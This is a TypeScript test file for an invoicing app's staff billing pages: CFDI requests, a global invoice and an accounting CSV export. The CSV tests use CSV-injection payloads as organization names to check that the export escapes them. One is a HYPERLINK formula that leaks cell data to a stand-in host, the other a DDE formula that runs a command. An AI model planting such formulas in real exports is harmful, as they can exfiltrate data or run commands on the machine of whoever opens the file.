import type {
  StaffAccountingMonth,
  StaffCfdiRequest,
  StaffGlobalInvoice,
} from "@kardo/contracts";
import type { ReactNode } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

const request = vi.fn();
vi.mock("../src/lib/api.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../src/lib/api.js")>()),
  apiRequest: (...args: unknown[]) => request(...args),
}));
vi.mock("../src/lib/router.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../src/lib/router.js")>()),
  Link: ({ children }: { children: ReactNode }) => <a href="#x">{children}</a>,
}));

import { cfdiApi } from "../src/api/billing.js";
import {
  AccountingSummary,
  CfdiCard,
  GlobalTable,
} from "../src/features/billing/CfdiPage.js";
import {
  accountingCsv,
  accountingFilename,
  cfdiStatusLabels,
  cfdiUseLabel,
  csvCell,
  globalInvoiceCsv,
  globalInvoiceFilename,
  hoursSince,
  isOverdue,
  issueEmailNote,
  isValidSatUuid,
  monthLabel,
  monthOptions,
  previousMonth,
  requestedAgoLabel,
  taxRegimeLabel,
} from "../src/features/billing/cfdi.js";
import {
  isValidReason,
  noticeKindLabel,
} from "../src/features/billing/format.js";

const now = new Date("2026-10-05T18:00:00.000Z");
const hoursAgo = (hours: number) =>
  new Date(now.getTime() - hours * 3_600_000).toISOString();

function cfdi(overrides: Partial<StaffCfdiRequest> = {}): StaffCfdiRequest {
  return {
    id: "70000000-0000-4000-8000-000000000001",
    invoiceId: "in_1",
    status: "pending",
    requestedAt: hoursAgo(5),
    issuedAt: null,
    satUuid: null,
    notes: null,
    automatic: false,
    workspaceId: "20000000-0000-4000-8000-000000000001",
    workspaceName: "Café Nube",
    invoiceNumber: "KARDO-0041",
    amountPaid: 49_900,
    tax: 6_883,
    currency: "mxn",
    paidAt: "2026-10-05T03:30:00.000Z",
    fiscal: {
      rfc: "AAA010101AAA",
      legalName: "Café Nube SA de CV",
      taxRegime: "601",
      postalCode: "64000",
      cfdiUse: "G03",
      email: "facturas@nube.mx",
    },
    stripeInvoiceUrl: "https://dashboard.stripe.com/invoices/in_1",
    handledAt: null,
    facturapi: null,
    document: null,
    ...overrides,
  } as StaffCfdiRequest;
}

const global: StaffGlobalInvoice = {
  month: "2026-09",
  currency: "mxn",
  total: 69_800,
  tax: 9_628,
  items: [
    {
      invoiceId: "in_a",
      number: "KARDO-1",
      workspaceName: 'Taller "Brote", SA',
      paidAt: "2026-09-12T20:05:00.000Z",
      total: 49_900,
      tax: 6_883,
    },
    {
      invoiceId: "in_b",
      number: null,
      workspaceName: "Spa Cauce",
      paidAt: "2026-09-30T05:30:00.000Z",
      total: 19_900,
      tax: null,
    },
  ],
};

describe("labels and formats", () => {
  it("labels statuses, regimes and uses as code · name", () => {
    expect(cfdiStatusLabels.pending).toBe("Pendientes");
    expect(taxRegimeLabel("601")).toBe("601 · General de Ley Personas Morales");
    expect(cfdiUseLabel("G03")).toBe("G03 · Gastos en general");
    expect(taxRegimeLabel("999")).toBe("999");
  });

  it("labels the cfdi_issued notice", () => {
    expect(noticeKindLabel("cfdi_issued")).toBe("Factura emitida");
  });

  it("formats months in Mexico City time", () => {
    expect(previousMonth(new Date("2026-10-01T03:00:00.000Z"))).toBe("2026-08");
    expect(previousMonth(new Date("2026-01-15T12:00:00.000Z"))).toBe("2025-12");
    expect(monthOptions(now, 3)).toEqual(["2026-09", "2026-08", "2026-07"]);
    expect(monthLabel("2026-09")).toBe("septiembre de 2026");
  });

  it("writes the confirmation note with the real email", () => {
    expect(issueEmailNote("a@b.mx")).toBe(
      "Antes de marcarla, envía el XML y el PDF al correo fiscal del cliente (a@b.mx); al confirmar le avisamos por correo con el folio fiscal.",
    );
  });
});

describe("validation", () => {
  it("accepts only a SAT folio in UUID format", () => {
    expect(isValidSatUuid("3f2504e0-4f89-41d3-9a0c-0305e82c3301")).toBe(true);
    expect(isValidSatUuid(" 3F2504E0-4F89-41D3-9A0C-0305E82C3301 ")).toBe(true);
    expect(isValidSatUuid("3f2504e0-4f89-41d3-9a0c")).toBe(false);
    expect(isValidSatUuid("zf2504e0-4f89-41d3-9a0c-0305e82c3301")).toBe(false);
    expect(isValidSatUuid("")).toBe(false);
  });

  it("requires a reason of 3 to 500 characters", () => {
    expect(isValidReason("ab")).toBe(false);
    expect(isValidReason("RFC inválido")).toBe(true);
    expect(isValidReason("x".repeat(501))).toBe(false);
  });
});

describe("24 hour alert", () => {
  it("counts hours and flags only past 24 hours", () => {
    expect(hoursSince(hoursAgo(5), now)).toBe(5);
    expect(isOverdue(hoursAgo(24), now)).toBe(false);
    expect(isOverdue(hoursAgo(25), now)).toBe(true);
    expect(requestedAgoLabel(hoursAgo(5), now)).toBe("Pedida hace 5 horas");
    expect(requestedAgoLabel(hoursAgo(1), now)).toBe("Pedida hace 1 hora");
    expect(requestedAgoLabel(hoursAgo(72), now)).toBe("Pedida hace 3 días");
  });

  it("renders the overdue mark and the fiscal data", () => {
    const html = (overrides: Partial<StaffCfdiRequest>, canWrite = true) =>
      renderToStaticMarkup(
        <CfdiCard
          canWrite={canWrite}
          now={now}
          onResolve={() => undefined}
          request={cfdi(overrides)}
        />,
      );
    const late = html({ requestedAt: hoursAgo(30) });
    expect(late).toContain("cfdi-card-overdue");
    expect(late).toContain("pasaron más de 24 horas");
    expect(late).toContain("601 · General de Ley Personas Morales");
    expect(late).toContain("G03 · Gastos en general");
    expect(late).toContain("Ver pago en Stripe");
    expect(late).toContain("Marcar emitida");
    expect(late).toContain("Rechazar");
    const fresh = html({});
    expect(fresh).not.toContain("cfdi-card-overdue");
    expect(fresh).toContain("Pedida hace 5 horas");
    expect(html({ automatic: true })).toContain("Factura de cada pago");
    expect(html({}, false)).not.toContain("Marcar emitida");
    expect(html({ status: "issued" })).toContain("Marcar cancelada");
  });
});

describe("CFDI with Facturapi (ADR 020 §6, phase 2)", () => {
  const html = (overrides: Partial<StaffCfdiRequest>) =>
    renderToStaticMarkup(
      <CfdiCard
        canWrite
        now={now}
        onResolve={() => undefined}
        request={cfdi(overrides)}
      />,
    );

  it("offers Facturapi first when it is configured, and the manual way too", () => {
    const pending = html({ facturapi: "test" });
    expect(pending).toContain("Emitir con Facturapi (prueba)");
    expect(pending).toContain("Marcar emitida a mano");
    const manualOnly = html({ facturapi: null });
    expect(manualOnly).not.toContain("Facturapi");
    expect(manualOnly).toContain("Marcar emitida");
  });

  it("an issued test CFDI says so and offers its PDF and XML", () => {
    const issued = html({
      status: "issued",
      satUuid: "9f1c2a3b-4d5e-4f60-8a7b-1c2d3e4f5a6b",
      facturapi: "test",
      document: { provider: "facturapi", test: true },
    });
    expect(issued).toContain("De prueba, sin validez fiscal");
    expect(issued).toContain("Descargar PDF");
    expect(issued).toContain("Descargar XML");
    expect(issued).not.toContain("Emitir con Facturapi");
  });
});

describe("global invoice", () => {
  it("builds a CSV with escaped cells and pesos", () => {
    const lines = globalInvoiceCsv(global).split("\r\n");
    expect(lines[0]).toBe("Folio Stripe,Organización,Fecha de pago,Total,IVA");
    expect(lines[1]).toBe(
      'KARDO-1,"Taller ""Brote"", SA",2026-09-12 14:05,499.00,68.83',
    );
    expect(lines[2]).toBe("in_b,Spa Cauce,2026-09-29 23:30,199.00,");
    expect(globalInvoiceCsv(global)).not.toContain("—");
    expect(globalInvoiceFilename("2026-09")).toBe("factura-global-2026-09.csv");
  });

  it("an organization name never opens as a spreadsheet formula", () => {
    const hostile = {
      ...global,
      items: [
        {
          ...global.items[0]!,
          workspaceName: '=HYPERLINK("https://x.test/?d="&A2,"x")',
        },
        { ...global.items[1]!, workspaceName: "@SUM(1+1)" },
      ],
    };
    const lines = globalInvoiceCsv(hostile).split("\r\n");
    expect(lines[1]).toContain(
      `"'=HYPERLINK(""https://x.test/?d=""&A2,""x"")"`,
    );
    expect(lines[2]).toContain(",'@SUM(1+1),");
    for (const value of ["+1", "-1", "\tx", "\rx"]) {
      expect(csvCell(value).replace(/^"/, "")).toMatch(/^'/);
    }
    expect(csvCell("Spa Cauce")).toBe("Spa Cauce");
  });

  it("renders the lines and the totals", () => {
    const html = renderToStaticMarkup(<GlobalTable invoice={global} />);
    expect(html).toContain("KARDO-1");
    expect(html).toContain("Totales (2 pagos)");
    expect(html).toContain("$698");
  });
});

describe("API calls", () => {
  beforeEach(() => request.mockReset().mockResolvedValue({}));

  it("lists by status, resolves and reads the global invoice", async () => {
    await cfdiApi.list("pending");
    expect(request).toHaveBeenLastCalledWith(
      "/v1/staff/billing/cfdi?status=pending",
      { signal: undefined },
    );
    await cfdiApi.resolve("r1", {
      status: "issued",
      satUuid: "3f2504e0-4f89-41d3-9a0c-0305e82c3301",
    });
    expect(request).toHaveBeenLastCalledWith(
      "/v1/staff/billing/cfdi/r1/resolve",
      {
        method: "POST",
        body: {
          status: "issued",
          satUuid: "3f2504e0-4f89-41d3-9a0c-0305e82c3301",
        },
      },
    );
    await cfdiApi.resolve("r1", { status: "rejected", notes: "RFC inválido" });
    expect(request).toHaveBeenLastCalledWith(
      "/v1/staff/billing/cfdi/r1/resolve",
      { method: "POST", body: { status: "rejected", notes: "RFC inválido" } },
    );
    await cfdiApi.globalInvoice("2026-09");
    expect(request).toHaveBeenLastCalledWith(
      "/v1/staff/billing/global-invoice?month=2026-09",
      { signal: undefined },
    );
  });
});

describe("demo mode", () => {
  let ask: <T>(path: string, method?: string, body?: unknown) => Promise<T>;
  beforeAll(async () => {
    vi.stubGlobal("window", globalThis);
    const demo = await import("../src/lib/demo.js");
    ask = <T,>(path: string, method = "GET", body?: unknown) =>
      demo.demoRequest<T>(path, { method, body });
  });

  it("seeds the queue and lets staff resolve requests", async () => {
    const pending = await ask<StaffCfdiRequest[]>(
      "/v1/staff/billing/cfdi?status=pending",
    );
    expect(pending).toHaveLength(2);
    expect(
      pending.filter((item) => isOverdue(item.requestedAt, new Date())),
    ).toHaveLength(1);
    expect(
      await ask<unknown[]>("/v1/staff/billing/cfdi?status=issued"),
    ).toHaveLength(1);
    expect(
      await ask<unknown[]>("/v1/staff/billing/cfdi?status=rejected"),
    ).toHaveLength(1);

    const first = pending[0] as StaffCfdiRequest;
    const done = await ask<StaffCfdiRequest>(
      `/v1/staff/billing/cfdi/${first.id}/resolve`,
      "POST",
      { status: "issued", satUuid: "3f2504e0-4f89-41d3-9a0c-0305e82c3301" },
    );
    expect(done.status).toBe("issued");
    expect(
      await ask<unknown[]>("/v1/staff/billing/cfdi?status=pending"),
    ).toHaveLength(1);
  });

  it("returns a coherent global invoice", async () => {
    const invoice = await ask<StaffGlobalInvoice>(
      "/v1/staff/billing/global-invoice?month=2026-09",
    );
    expect(invoice.month).toBe("2026-09");
    expect(invoice.total).toBe(
      invoice.items.reduce((sum, item) => sum + item.total, 0),
    );
  });
});

describe("accounting month (for the accountant)", () => {
  const amounts = (count: number, total: number) => {
    const base = Math.round(total / 1.16);
    return { count, total, base, iva: total - base };
  };
  const report: StaffAccountingMonth = {
    month: "2026-09",
    currency: "mxn",
    livemode: false,
    generatedAt: "2026-10-02T12:00:00.000Z",
    payments: [
      {
        invoiceId: "in_TESTacct001",
        number: "KARDO-0001",
        workspaceName: "=cmd|' /C calc'!A0",
        paidAt: "2026-09-12T20:05:00.000Z",
        total: 19900,
        base: 17155,
        iva: 2745,
        refunded: 0,
        path: "individual",
        satUuid: "9f1c2a3b-4d5e-4f60-8a7b-1c2d3e4f5a6b",
        cfdiTest: true,
        stripeChargeId: "ch_TESTacct001",
        stripeFee: 1116,
        stripeFeeIva: 179,
      },
      {
        invoiceId: "in_TESTacct002",
        number: null,
        workspaceName: "Spa Cauce",
        paidAt: "2026-09-29T23:30:00.000Z",
        total: 37900,
        base: 32672,
        iva: 5228,
        refunded: 8334,
        path: "global",
        satUuid: null,
        cfdiTest: false,
        stripeChargeId: null,
        stripeFee: null,
        stripeFeeIva: null,
      },
    ],
    refunds: [
      {
        refundId: "re_TESTacct001",
        invoiceId: "in_TESTacct002",
        number: null,
        workspaceName: "Spa Cauce",
        createdAt: "2026-09-30T18:00:00.000Z",
        status: "succeeded",
        amount: 8334,
        base: 7184,
        iva: 1150,
        originalPath: "global",
        originalSatUuid: null,
        originalMonth: "2026-09",
      },
    ],
    totals: {
      individual: amounts(1, 19900),
      individual_pending: amounts(0, 0),
      global: amounts(1, 37900),
      internal: amounts(0, 0),
      all: { count: 2, total: 57800, base: 49827, iva: 7973 },
      refunds: { count: 1, total: 8334, base: 7184, iva: 1150 },
    },
    stripe: {
      charges: { count: 2, amount: 57800 },
      refunds: { count: 1, amount: 8334 },
      fees: { amount: 2600, iva: 416, total: 3016 },
      net: 46450,
      matchedCharges: 1,
    },
    warnings: [
      {
        kind: "kardo_unmatched_payment",
        reference: "in_TESTacct002",
        message: "in_TESTacct002: Kardo lo tiene pagado, pero Stripe no.",
      },
    ],
  };

  it("one row per payment and refund, refunds in negative, then the summary", () => {
    const lines = accountingCsv(report).split("\r\n");
    expect(lines[0]).toBe(
      "Tipo,Fecha (México),Folio Stripe,Organización,Camino,Folio fiscal (UUID),CFDI de prueba,Total,Base sin IVA,IVA,Reembolsado,Cobro en Stripe,Comisión Stripe sin IVA,IVA de la comisión",
    );
    expect(lines[1]).toBe(
      `Cobro,2026-09-12 14:05,KARDO-0001,'=cmd|' /C calc'!A0,CFDI individual,9f1c2a3b-4d5e-4f60-8a7b-1c2d3e4f5a6b,Sí,199.00,171.55,27.45,,ch_TESTacct001,11.16,1.79`,
    );
    expect(lines[2]).toBe(
      "Cobro,2026-09-29 17:30,in_TESTacct002,Spa Cauce,Factura global,,,379.00,326.72,52.28,83.34,,,",
    );
    expect(lines[3]).toBe(
      "Reembolso,2026-09-30 12:00,in_TESTacct002,Spa Cauce,Factura global de 2026-09,,,-83.34,-71.84,-11.50,,re_TESTacct001,,",
    );
    expect(lines[4]).toBe("");
    expect(lines).toContain("Total cobrado del mes,2,578.00,498.27,79.73");
    expect(lines).toContain("Reembolsos del mes,1,-83.34,-71.84,-11.50");
    expect(lines).toContain("Stripe: comisiones (gasto),,-30.16,-26.00,-4.16");
    expect(accountingFilename("2026-09")).toBe(
      "kardo-contabilidad-2026-09.csv",
    );
  });

  it("shows the paths, Stripe's side and what to review", () => {
    const html = renderToStaticMarkup(<AccountingSummary report={report} />);
    expect(html).toContain("CFDI individual");
    expect(html).toContain("Factura global");
    expect(html).toContain("Total cobrado del mes");
    expect(html).toContain("1 conciliados con Kardo");
    expect(html).toContain("1 punto por revisar");
    const clean = renderToStaticMarkup(
      <AccountingSummary report={{ ...report, warnings: [] }} />,
    );
    expect(clean).toContain("cuadra con Stripe");
  });
});
